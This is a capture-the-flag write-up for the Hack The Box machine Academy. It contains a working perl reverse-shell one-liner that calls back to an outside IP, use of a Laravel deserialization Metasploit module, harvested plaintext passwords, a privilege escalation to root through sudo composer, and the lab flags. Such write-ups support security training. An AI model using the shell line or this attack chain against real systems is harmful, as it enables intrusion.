academy

# Academy HTB [ 10.10.10.215 ]


## Foothold

- Tamper the **uid** parameter from 0 to 1 by intercepting user registration request with **burpsuite**.

- Access the  [Admin Page](http://academy.htb/admin.php) with registered credentials.


## User

- Access http://dev-staging-01.academy.htb/ to find out the **APP_KEY** in the logs.

- Use msf exploit to get foothold in the target system. (unix/http/laravel_token_unserialize_exec )
- Use the following command to get interactive shell using perl.


```bash 
perl -e 'use Socket;$i="10.10.14.205";$p=42522;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


- Once you get the shell check the .env file for sensitive information.

`/var/www/html/academy/.env mySup3rP4s5w0rd!!`

	The possible combination for the password found in the .env file is cry0l1t3:mySup3rP4s5w0rd!!

```bash
ssh cry0l1t3@academy.htb : mySup3rP4s5w0rd!!
```

` user.txt 78bcd0814ff1ad17723acc2d82ca7f72 `

## Privilege Escalation

- Use the linpeas and check in the /var/log/auth.log

`/var/log/auth.log su - "mrb3n_Ac@d3my!" `

- We know that there is an user name mrb3n, use this cerdential against that user.

	mrb3n:mrb3n_Ac@d3my!

```bash
su mrb3n
Password:
sudo -l
Password:
(ALL) /usr/bin/composer

```
- Now we know that the user `mrb3n` can run the composer as root user. Let's use [GTFO BINS](https://gtfobins.github.io/gtfobins/composer/) to escalate the privileges.

### Gameover

```bash
whoami
uid=0(root) gid=0(root) groups=0(root)
cd /root 
cat root.txt
ccc19bd403b36d44b67196773f833075
```

